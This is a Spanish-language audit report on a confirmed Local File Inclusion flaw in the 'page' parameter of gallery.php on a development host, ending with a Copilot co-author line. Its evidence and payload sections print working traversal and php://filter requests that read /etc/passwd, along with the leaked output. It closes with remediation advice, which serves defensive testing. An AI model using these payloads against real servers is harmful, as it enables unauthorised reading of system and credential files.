# Informe de auditoría LFI — web.dev.local:8081

Fecha: 2026-04-27T06:40:53Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se detectó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` del endpoint `gallery.php` que permite leer archivos locales del servidor.

Evidencia
---------
Se probaron las siguientes solicitudes y se obtuvieron los resultados indicados:

- URL probada (traversal directo):
  http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd

  Respuesta (extracto):
  ## 🎨 Galería de Arte Virtual

  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  ...

- URL probada (php filter, lectura base64) — no fue necesario en este caso porque el traversal directo devolvió el contenido.

Detalles técnicos
-----------------
- Parámetro vulnerable: `page` en `gallery.php`.
- Comportamiento observado: la aplicación incluye o lee directamente el valor de `page` sin saneamiento suficiente, permitiendo path traversal y lectura de archivos sensibles como `/etc/passwd`.

Impacto
-------
- Confidencialidad: Alto — lectura de archivos locales (posible exfiltración de credenciales y archivos de configuración).
- Integridad y disponibilidad: Medio/Bajo — LFI puede llevar a ejecución remota en contextos adicionales (por ejemplo, mediante upload + include, o use of php wrappers) si hay vectores adicionales.

Prueba de explotación
---------------------
La prueba de explotación se realizó leyendo `/etc/passwd` mediante traversal en el parámetro `page`, obteniendo el contenido del archivo en la respuesta HTTP como se muestra en la evidencia.

Conclusión
----------
- LFI confirmada: Sí.
- Explotación realizada: Sí, lectura de `/etc/passwd`.

Recomendaciones
---------------
1. No incluir directamente entradas controladas por el usuario. Implementar un mapa de páginas permitido (whitelist) y resolver nombres lógicos a archivos en servidor de forma segura.
2. Normalizar y validar el parámetro `page`: rechazar rutas que contienen `..`, `/`, o codificaciones equivalentes, y usar basename() para extraer nombres de archivo cuando proceda.
3. Evitar concatenar entradas de usuario en rutas de filesystem; usar identificadores internos y mapeos a rutas fijas.
4. Deshabilitar allow_url_include y otras directivas peligrosas en la configuración de PHP.
5. Minimizar privilegios del usuario que ejecuta el servidor web y proteger archivos sensibles con permisos adecuados.

Archivos probados / payloads
----------------------------
- gallery.php?page=../../../../etc/passwd — lectura directa de /etc/passwd (éxito)
- gallery.php?page=php://filter/convert.base64-encode/resource=/etc/passwd — usable en otros entornos si el archivo objetivo tiene restricción de extensión

Anexos
------
Captura de la respuesta con el contenido de /etc/passwd incluida en el cuerpo HTTP (ver evidencia arriba).

Co-autores
----------
Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>
